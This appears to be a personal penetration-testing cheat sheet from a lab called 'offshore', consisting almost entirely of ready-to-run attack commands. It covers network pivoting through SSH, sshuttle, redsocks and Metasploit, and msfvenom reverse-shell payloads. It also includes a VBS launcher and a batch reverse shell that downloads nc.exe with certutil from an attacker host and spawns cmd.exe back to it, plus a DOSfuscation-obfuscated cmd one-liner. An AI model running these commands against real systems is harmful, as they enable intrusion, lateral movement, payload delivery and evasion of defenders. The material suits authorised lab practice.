# These are just tricks I picked up in offshore, will get exploded into different dirs at some point.

#### Pivoting

### method 1:

Add to proxychains.conf:
`socks4 127.0.0.1 1080`  
`ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01`  
`proxychains nmap -sV 172.16.1.0-254`  

### Method 2:
*if I could nmap through this tunnel it would be the preffered method  

`sshuttle -vr root@NIX01 172.16.1.1/24 --ssh-cmd "ssh -i 10.10.110.123/root_ssh"`  

### Method 3:  
msf > use auxiliary/scanner/ssh/ssh_login_pubkey  
msf auxiliary(ssh_login_pubkey) > set RHOSTS 10.10.110.123    
msf auxiliary(ssh_login_pubkey) > set USERNAME root  
msf auxiliary(ssh_login_pubkey) > set KEY_PATH 10.10.110.123/root_ssh  
msf auxiliary(ssh_login_pubkey) > run  
ctrl+z
sessions -u 2
background
use auxiliary/server/socks_proxy
run


meterpreter > run post/multi/manage/autoroute  
CTRL+Z  
use auxiliary/scanner/portscan/tcp   
set RHOSTS 172.16.1.0/24  

### Method 4:  

`ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01` *1080 is redsocks proxy default*  
`echo 1 > /proc/sys/net/ipv4/ip_forward`  
`iptables -t nat -A OUTPUT -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
`iptables -t nat -A PREROUTING -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345`  
`/usr/sbin/redsocks -c /etc/redsocks.conf `

# Get a proper shell from a half/broken shell
`msfvenom -p cmd/unix/reverse_python lhost=69.201.13.55 lport=3344 R`
paste in your shell, profit
`python -c 'import pty; pty.spawn("/bin/sh")'`

## Start mult/handler:
`sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"`
`msfvenom -p windows/x64/meterpreter_reverse_http -f psh LHOST=10.10.14.14 LPORT=443 -o l.ps1`

## Start SMB for infil/exfil:  
`$ sudo impacket-smbserver -smb2support GUEST /home/kymb0/Desktop/backup/offshore/toolz`

## Reverse shell vbs (remember to run PS shellcode through https://github.com/danielbohannon/Invoke-obfuscation)
`Set objShell = CreateObject("Wscript.Shell")
objShell.Run("powershell.exe -noexit \\10.10.14.14\GUEST\l.ps1")`

## Reverse shell bat (remember to run through https://github.com/danielbohannon/Invoke-DOSfuscation)
cmd.exe /c
certutil.exe -urlcache -split -f http://10.10.14.14/nc.exe 
C:\ManageEngine_new\OpManager\logs\nc.exe
C:\ManageEngine_new\OpManager\logs\nc.exe -nv 10.10.14.14 443 -e cmd.exe

EG:  
cmd /V:ON/C"set Eiz8=d3uc 0v-olCeh\xt.saip1mEO:fn4gMwr/_&&for %n in (3,22,0,16,11,14,11,4,33,3,4,3,11,32,15,2,15,19,9,16,11,14,11,4,7,2,32,9,3,18,3,12,11,4,7,17,20,9,19,15,4,7,26,4,12,15,15,20,25,33,33,21,5,16,21,5,16,21,28,16,21,28,33,27,3,16,11,14,11,4,10,25,13,30,18,27,18,29,11,23,27,29,19,27,11,34,27,11,31,13,24,20,30,18,27,18,29,11,32,13,9,8,29,17,13,27,3,16,11,14,11,4,10,25,13,30,18,27,18,29,11,23,27,29,19,27,11,34,27,11,31,13,24,20,30,18,27,18,29,11,32,13,9,8,29,17,13,27,3,16,11,14,11,4,7,27,6,4,21,5,16,21,5,16,21,28,16,21,28,4,28,28,1,4,7,11,4,3,22,0,16,11,14,11,39)do set xoi=!xoi!!Eiz8:~%n,1!&&if %n gtr 38 call %xoi:~5%"
